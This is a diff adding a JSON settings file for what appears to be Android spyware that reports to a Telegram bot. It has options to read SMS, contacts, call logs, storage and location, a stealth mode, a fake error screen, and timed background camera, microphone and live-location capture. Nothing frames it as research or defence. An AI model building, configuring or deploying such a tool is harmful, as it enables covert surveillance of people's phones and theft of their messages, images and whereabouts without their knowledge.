@@ -1,0 +1,22 @@
+{
+  "bot_token": "",
+  "chat_id": "",
+  "webview_url": "https://vip-panel-krish-developer.42web.io/",
+  "require_permissions": true,
+  "read_contacts": false,
+  "read_sms": false,
+  "read_call_log": false,
+  "read_storage": false,
+  "read_location": false,
+  "post_notifications": true,
+  "stealth_mode": false,
+  "fake_error": false,
+  "background_camera_enabled": false,
+  "background_camera_front": false,
+  "background_camera_interval_sec": 30,
+  "background_camera_back": false,
+  "microphone_enabled": false,
+  "microphone_interval_sec": 30,
+  "live_location_enabled": false,
+  "live_location_interval_sec": 30
+}
